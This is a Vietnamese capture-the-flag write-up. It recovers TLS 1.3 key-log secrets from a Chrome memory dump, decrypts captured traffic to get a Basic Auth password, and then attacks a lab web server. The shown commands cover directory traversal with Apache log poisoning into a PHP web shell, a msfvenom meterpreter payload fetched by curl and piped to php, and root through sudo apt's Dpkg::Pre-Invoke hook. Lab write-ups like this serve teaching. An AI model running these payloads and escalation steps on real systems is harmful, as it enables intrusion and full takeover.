# tls-memory-sslkeylog

- **Category:** Forensic (Memory + Network + Pentest) — bài chuỗi nhiều giai đoạn
- **File đề:** một **memory dump** (`memorydump.mem`) + một **packet capture** (pcap) bắt từ Windows-Attackbox (`10.0.10.12`) trong môi trường thi. **KHÔNG có file offline trong repo**; flag chỉ hiện trên server. Dưới đây tái dựng đầy đủ phương pháp.

## Tóm tắt đề
Chuỗi bước: (1) pcap có phiên **TLS 1.3** giữa `10.0.10.12` và `10.0.10.90` cần giải mã; (2) để giải mã cần file khóa trỏ bởi `SSLKEYLOGFILE` — nằm trong memory dump của Chrome; (3) sau giải mã đọc được credential đăng nhập `https://target9/index.php`; (4) Target9 dính **directory traversal + log poisoning** → RCE `www-data`; (5) **leo quyền** qua `sudo apt` (GTFOBins) → root → đọc `/root/flag.txt`.

## Phân tích (chi tiết: khóa thật, offset, credential)
- **Pcap:** lọc lưu lượng nội segment để khoanh vùng TLS 1.3 với `10.0.10.90`.
- **Vì sao phải lấy key từ RAM:** TLS 1.3 dùng ECDHE (forward secrecy) ⇒ **không** giải mã được bằng private key RSA của server; **bắt buộc** có key log (`SSLKEYLOGFILE`).
- **Memory forensics:** file log `tlskey.log` không extract được trực tiếp (`filescan`/`dumpfiles` fail), nhưng Chrome.exe giữ các dòng secret **plaintext trong RAM** → dump process Chrome rồi `strings | grep SECRET` để dựng lại key log.
  - Profile Volatility: `Win10x64_19041`.
  - Có nhiều `chrome.exe`; PID đọc `SSLKEYLOGFILE` = `C:\Users\attacker\Documents\tlskey.log`. **Chọn PID lớn nhất/mới nhất = 4960.**
  - `client_random` chung của phiên: `74d7ce88c54f0e4a7ab29c46108121a70046bd1da0c66df151d3ab66f73fe21f`.
  - Các dòng key log dạng: `SERVER_HANDSHAKE_TRAFFIC_SECRET`, `CLIENT_TRAFFIC_SECRET_0`, `SERVER_TRAFFIC_SECRET_0`, `EXPORTER_SECRET <client_random> <secret>`.
- **Credential thật (từ HTTP sau giải mã):** request GET `/index.php` trả `401` rồi `200`; header `Authorization: Basic Y3NndXNlcjpYOGtnUXByaA==`.
  - Base64-decode → `<REDACTED_USER>:X8kgQprh`. **Username bị redact** vì chứa tiền tố viết tắt tên kỳ thi CTF (dạng `<abbr>user`); mật khẩu = `X8kgQprh`.
- **Web exploit:** URL có tham số `file=` → directory traversal; Apache access log đọc được qua traversal và ghi lại request của client → **log poisoning** nhét PHP web shell.
- **PrivEsc:** `sudo -l` cho `www-data` chạy `/usr/bin/apt` NOPASSWD → hook `Dpkg::Pre-Invoke` chạy shell root (GTFOBins).
- `/root/flag.txt` kích thước 42 byte.

## Kỹ thuật áp dụng (+ VÌ SAO)
- **Volatility** (`imageinfo`, `pstree`, `envars`, `filescan`, `memdump`). *Vì sao:* khoanh profile → tìm Chrome → xác nhận `SSLKEYLOGFILE` → dump process lấy secret.
- **Giải mã TLS trong Wireshark** bằng (Pre)-Master-Secret log. *Vì sao:* TLS 1.3 ECDHE chỉ giải được bằng session secret, không bằng private key.
- **HTTP Basic Auth decode** (`Authorization: Basic <b64>` → `user:pass`).
- **Directory traversal + Apache log poisoning** → web shell PHP.
- **Metasploit** `multi/handler` + `php/meterpreter/reverse_tcp` (tùy chọn, cho shell ổn định).
- **PrivEsc qua apt (GTFOBins):** `Dpkg::Pre-Invoke`.

## Lời giải chi tiết (bước + lệnh sạch)
### 1. Khoanh vùng TLS trong pcap
```
ip.src == 10.0.10.0/24 && ip.dst == 10.0.10.0/24      # → thấy TLS 1.3 với 10.0.10.90
```
### 2. Memory forensics lấy TLS key log
```bash
python vol.py -f memorydump.mem imageinfo                                  # → Win10x64_19041
python vol.py -f memorydump.mem --profile=Win10x64_19041 pstree            # nhiều chrome.exe
python vol.py -f memorydump.mem --profile=Win10x64_19041 envars \
   --pid 4444,1920,2356,4960,2796,4780,2580,3952 | grep SSLKEYLOGFILE      # → ...\tlskey.log
python vol.py -f memorydump.mem --profile=Win10x64_19041 filescan | grep tlskey.log   # không extract được
# Chuyển hướng: dump Chrome PID lớn nhất (4960), lọc dòng SECRET
python vol.py -f memorydump.mem --profile=Win10x64_19041 memdump -p 4960 -D .
strings 4960.dmp | grep SECRET > tlskey.log
```
### 3. Giải mã TLS trong Wireshark
Preferences → Protocols → TLS → **(Pre)-Master-Secret log filename** = `tlskey.log`. Lọc:
```
http && ip.addr eq 10.0.10.90        # GET /index.php: 401 → 200 (auth thành công)
```
### 4. Lấy credential
```bash
echo -n Y3NndXNlcjpYOGtnUXByaA== | base64 -d
# <REDACTED_USER>:X8kgQprh   (username redact vì chứa viết tắt tên giải; password = X8kgQprh)
```
### 5. Khai thác Target9 (traversal + log poisoning)
```
https://target9/index.php?file=../../../../var/log/apache2/access.log&cmd=whoami
```
Gửi một request chứa PHP web shell (bị 400 nhưng vẫn ghi vào access.log), rồi gọi lại URL trên với `cmd=whoami` → `www-data`.
### 6. (Tùy chọn) reverse shell ổn định
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.10.20 LPORT=8888 -f raw > shell.php
python3 -m http.server 4444
msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 8888; exploit"
# kích hoạt:
# https://target9/index.php?file=../../../../var/log/apache2/access.log&cmd=curl%20http://10.0.10.20:4444/shell.php%20|%20php
```
### 7. Leo quyền qua apt + đọc flag
```bash
sudo -l                                      # (ALL) NOPASSWD: /usr/bin/apt
TF=$(mktemp); echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt install -c $TF sl                   # hook chạy /bin/sh với quyền root
id                                           # uid=0(root)
cat /root/flag.txt
```

## Flag
```
flag{...}
```
**Nguồn không nêu.** `SOLUTIONS_VN.md` (B2) và nháp `Can you parse TLS traffic.md` chỉ dừng ở lệnh `cat /root/flag.txt` mà không in nội dung (flag chỉ hiện trên server, file 42 byte). Credential trung gian: `<REDACTED_USER>:X8kgQprh`.

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu:** có cả pcap (TLS 1.3) + memory dump → gần như chắc cần lấy `SSLKEYLOGFILE` từ RAM; URL `?file=...` → LFI/traversal; `sudo -l` ra binary GTFOBins → privesc.
- **Quy trình giải TLS từ memory:** `imageinfo` → `pstree` tìm trình duyệt → `envars --pid ...| grep SSLKEYLOGFILE` → nếu `filescan`/`dumpfiles` fail thì `memdump -p <pid>` rồi `strings | grep SECRET` → nạp key log vào Wireshark.
- **Bẫy:** TLS 1.3 KHÔNG giải được bằng private key server (ECDHE); chọn đúng PID Chrome (lớn nhất/mới nhất); `grep SECRET` để lọc đúng dòng key log; log poisoning cần request thực sự được ghi vào `access.log` và traversal đúng số cấp `../`.
- **Checklist:** lọc TLS 1.3 → Volatility (profile→pstree→envars→memdump) → `strings|grep SECRET` → Wireshark → decode Basic Auth → login → traversal → log poisoning → web shell → `sudo -l` apt → root → `cat /root/flag.txt`.
